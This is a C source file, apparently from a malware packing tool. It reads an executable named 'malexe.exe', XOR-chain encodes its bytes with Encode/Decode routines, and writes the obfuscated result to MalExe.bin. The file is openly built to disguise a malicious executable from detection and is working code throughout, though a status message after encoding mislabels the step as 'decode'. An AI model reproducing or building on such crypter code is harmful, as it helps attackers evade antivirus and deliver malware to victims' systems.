#include "encode.h"


DWORD Encode(BYTE *in, DWORD dwFileSize)
{
	DWORD i;
	for (i = 1; i < dwFileSize; i++)
	{
		in[i] = in[i-1] ^ in[i];
	}
	return i;
}


DWORD Decode(BYTE *in, DWORD dwFileSize)
{
	DWORD i;
	BYTE temp = in[0];
	for (i = 1; i < dwFileSize; i++)
	{
		in[i] = temp ^ in[i];
		temp = temp ^ in[i];
	}
	return i;
}


int MalExeEncode(LPTSTR szMalExeName)
{
	//create szMalExe
	HANDLE hMalExeFile = CreateFile(szMalExeName,
		GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hMalExeFile)
	{
		printf("exe file not found\n");
		return -1;
	}
	printf("[+] opened malexe.exe, handle 0x%x\n", hMalExeFile);

	//getlength
	LARGE_INTEGER liFileSize;
	DWORD dwFileSize;
	BOOL err = GetFileSizeEx(hMalExeFile, &liFileSize);
	if (FALSE == err)
	{
		return -1;
	}
	dwFileSize = liFileSize.LowPart;
	printf("[+] malexe size is 0x%x\n", dwFileSize);

	BYTE *buffer = (BYTE*)malloc(dwFileSize);
	if (NULL == buffer)
	{
		printf("Malloc failed\n");
		return -1;
	}
	printf("[+] allocated 0x%x bytes\n", dwFileSize);

	//read szMalExe
	DWORD read = 0;
	if (FALSE == ReadFile(hMalExeFile, buffer, dwFileSize, &read, NULL))
	{
		return -1;
	}
	printf("[+] read MalExe.exe to buffer\n");

	if (dwFileSize != Encode(buffer, dwFileSize))
	{
		printf("decode error");
		return -1;
	}
	printf("[+] decode success\n");

	//create MalExe.bin
	HANDLE hMalBinFile = CreateFile("MalExe.bin",
		GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hMalBinFile)
	{
		printf("exe file not found\n");
		return -1;
	}
	printf("[+] opened MalExe.bin, handle 0x%x\n", hMalBinFile);

	//write MalExe.bin
	DWORD wrote = 0;
	if (FALSE == WriteFile(hMalBinFile, buffer, dwFileSize, &wrote, NULL))
	{
		return -1;
	}
	printf("[+] wrote in MalExe.bin\n");

	CloseHandle(hMalExeFile);
	CloseHandle(hMalBinFile);
	free(buffer);

	return 0;
}